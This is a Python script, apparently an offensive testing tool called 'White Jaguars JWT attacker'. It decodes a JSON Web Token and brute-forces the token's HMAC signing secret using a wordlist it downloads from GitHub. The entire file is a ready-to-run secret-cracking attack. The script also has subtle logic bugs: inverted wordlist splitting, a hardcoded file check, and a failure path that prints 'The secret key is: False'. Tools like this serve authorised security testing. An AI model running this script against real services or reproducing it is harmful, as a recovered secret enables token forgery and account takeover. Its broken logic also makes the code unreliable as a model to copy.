import argparse, json, requests, os
from jwt.jwk import AbstractJWKBase, OctetJWK
from jwt import JWT


class JwtAttacker:

    def __init__(self):
        print('\n================================')
        print('White Jaguars JWT attacker')
        print('\n================================')
        self.instance = JWT()
        self.secret = None
        self.token = None
        self.decoded = None
        self.json_string = None

    def decode(self, token, do_verify=False):
        try:
            decoded = self.instance.decode(token, do_verify=do_verify, do_time_check=False)
            return decoded
        except:
            pass
        return None

    def open_list(self, file_name):
        file_contents = None
        try:
            if os.path.isfile('jwt.secrets.list') and os.path.exists('jwt.secrets.list'):
                with open(file_name, 'r') as file:
                    # Read the entire contents of the file into a variable
                    file_contents = file.read()
                file_contents = file_contents.split('\n')
        except:
            print(f'Unable to open the file: {file_name}')
        return file_contents

    def download_list(self):
        try:
            r = requests.get('https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list')
            text = r.text
            with open('jwt.secrets.list', 'w') as l:
                l.write(text)
            return True
        except:
            print('Unable to download the secrets list')
        return False

    def brute_force(self, token, secrets):
        if isinstance(secrets, str):
            secrets = [secrets] if secrets.find('\n') != -1 else secrets.split('\n')
        elif not isinstance(secrets, list):
            return None
        secret_found = None
        for s in secrets:
            secret_validation = None
            try:
                b_secret = s.encode('ascii')
                key = OctetJWK(b_secret)
                secret_validation = self.instance.decode(token, key, do_time_check=False)
            except Exception as e:
                pass
            if isinstance(secret_validation, dict):
                secret_found = s
                break
        return secret_found

    def jwt_test(self, token, secret=None):
        self.secret = secret
        self.token = token
        self.decoded = self.decode(self.token)
        if not isinstance(self.decoded, dict):
            print('Unable to decode the value provided')
            return False
        self.json_string = json.dumps(self.decoded, indent=4)
        print('Decoded value:')
        print(self.json_string)
        if self.secret in ['', None]:
            print('No secret provided')
            self.secret = attacker.open_list('jwt.secrets.list')
            if self.secret is None:
                print('Downloading a list for brute force testing')
                print('https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list')
                if not attacker.download_list():
                    print('Unable to download the list')
                    return False
                self.secret = attacker.open_list('jwt.secrets.list')
        if self.secret is None:
            return False
        secret_found = attacker.brute_force(token, self.secret)
        if secret_found is not None:
            return secret_found
        return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", "--secret", help='JWT Secret')
    parser.add_argument("-t", "--jwt", help='JWT value')
    args = parser.parse_args()
    jwt_secret = args.secret
    jwt_token = args.jwt
    attacker = JwtAttacker()
    if jwt_token in ['', None]:
        print('Invalid token')
        exit()
    print('Processing token:')
    print(jwt_token)

    result = attacker.jwt_test(jwt_token, jwt_secret)
    if result is not None:
        print(f'The secret key is: {result}')
        exit()
    print('Secret not found')
